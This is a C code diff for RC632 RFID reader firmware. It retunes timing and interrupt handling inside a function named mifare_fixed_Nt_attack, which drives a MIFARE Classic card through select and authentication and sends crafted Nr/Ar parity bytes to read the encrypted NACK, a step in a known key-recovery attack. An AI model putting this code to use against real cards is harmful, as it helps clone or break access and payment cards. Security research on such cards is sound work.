@@ -37,37 +37,23 @@ void clearFlagRxTimeout()
 void waitFlagRxTimeout()
 {
 	//return;//debug purpose
-	while(1){
+	while(FlagRxTimeout){
 	//wait
-	if(FlagRxTimeout == 0) break;
 	}
-	//pit_mdelay(1);//wait 1ms for RC632 FIFO length register, debug purpose
-	for(int i=0;i<1000000;i++)
-	{}
+	usleep(10);
 }
 
-void waitFlagRxTimeout_1()
+void waitFlagRxTimeout_1(int nbytes)
 {
-	u_int8_t reg_int_rq;
-	while(1){	
-		opcd_rc632_reg_read(NULL, RC632_REG_INTERRUPT_RQ, &reg_int_rq);
-		if((reg_int_rq & RC632_INT_RX) || (reg_int_rq & RC632_INT_TIMER)) {
-			opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_RQ, 0x3F);
-			return;
-		}
-	}
-}
-
-void waitBytesTime(int bytes)
-{
-	
+	usleep(10*nbytes*8+150);
 }
 
 void initRC632Irq()
 {	//clear all existing interrupt flags
 	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_RQ, 0x3F);
 	//enable timer interrupt and Rx interrupt
-	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, RC632_INT_SET|RC632_INT_RX|RC632_INT_TIMER);
+	//opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, RC632_INT_SET|RC632_INT_RX|RC632_INT_TIMER);
+	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, RC632_INT_SET|RC632_INT_IDLE|RC632_INT_TIMER);
 	//disable all interrupts
 	//opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, 0x3F);
 }
@@ -140,7 +126,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	//send idle command, debug purpose, temporarily delete this
 	//opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_IDLE);
 	//disable TX1 and TX2. See if we need to wait here...
-	//opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x58);
+	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x58);
+	usleep(1000);
 	//TODO: need to add wait delay for disable/enable TX, because RC632 needs time to respond
 	
 	//////////////////////////////
@@ -150,7 +137,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	//disable CRC and enable parity
 	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x03);
 	//enable TX1 and TX2
-	//opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x5B);
+	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x5B);
+	usleep(1000);
 	
 	//do the REQA tranceive
 	setRC632Timer(2);//important!! do not leave the timer uninitialized!!
@@ -158,7 +146,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	opcd_rc632_fifo_write(NULL, sizeof(REQA), &REQA, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
 	waitFlagRxTimeout();//wait for the command to finish	
-	//waitFlagRxTimeout_1();
+	//TODO: try until we can get a stable result here, and then proceed! It has something to do with RXwait
+	//waitFlagRxTimeout_1(3);
 
 	temp = opcd_rc632_fifo_read(NULL, 2, BUFFER);//read fifo, should get 0x20,00. Do we need to wait here?
 	if(temp != 2){
@@ -167,7 +156,7 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 		params->BLOCK=temp;//use BLOCK to store the error message
 		goto exit;
 	}
-	
+	//return 0;
 	//////////////////////////////
 	//do anti collision
 	//tranceive, send 0x93 20
@@ -175,8 +164,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(SELECT), SELECT, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout_1();
 	waitFlagRxTimeout();//wait for the command to finish
+	//waitFlagRxTimeout_1(7);
 	temp = opcd_rc632_fifo_read(NULL, 5, SELECT_UID+2);//read fifo, should get UID BCC	
 	
 	if(temp != 5){
@@ -198,8 +187,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(SELECT_UID), SELECT_UID, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout_1();
 	waitFlagRxTimeout();//wait for the command to finish
+	//waitFlagRxTimeout_1(12);
 	temp = opcd_rc632_fifo_read(NULL, 3, BUFFER);//read fifo, should get SAK, with 2-byte CRC-A
 	
 	if(temp != 3){
@@ -220,8 +209,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(AUTH_BLK_N), AUTH_BLK_N, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout_1();
 	waitFlagRxTimeout();//wait for the command to finish
+	//waitFlagRxTimeout_1(8);
 	temp = opcd_rc632_fifo_read(NULL, 4, params->Nt_actual);//read fifo, should get 32-bit Nt
 	
 	if(temp != 4){
@@ -240,8 +229,8 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, 9, params->Nr_Ar_Parity, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout_1();
 	waitFlagRxTimeout();//wait for the command to finish
+	//waitFlagRxTimeout_1(10);
 	temp = opcd_rc632_fifo_read(NULL, 1, &(params->NACK_encrypted));//read fifo, should get NACK or nothing
 	
 	switch(temp){
